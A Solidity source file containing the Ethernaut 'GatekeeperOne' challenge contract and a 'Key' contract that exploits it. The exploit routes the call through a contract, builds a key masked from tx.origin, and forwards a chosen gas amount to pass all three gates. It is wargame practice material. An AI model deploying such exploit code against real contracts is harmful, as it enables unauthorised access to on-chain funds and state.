pragma solidity ^0.4.18;

contract GatekeeperOne {

  address public entrant;
  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    require(msg.gas % 8191 == 0);
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
    require(uint32(_gateKey) == uint16(_gateKey));
    require(uint32(_gateKey) != uint64(_gateKey));
    require(uint32(_gateKey) == uint16(tx.origin));
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}

contract Key{

  bytes8 public key = bytes8(tx.origin) & 0xFFFFFFFF0000FFFF;

  function useKey(address ad, uint gas) public {
    //chage to ethernaut addd
    GatekeeperOne gate = GatekeeperOne(ad);
    gate.call.gas(gas)(bytes4(keccak256("enter(bytes8)")),key);
  }
}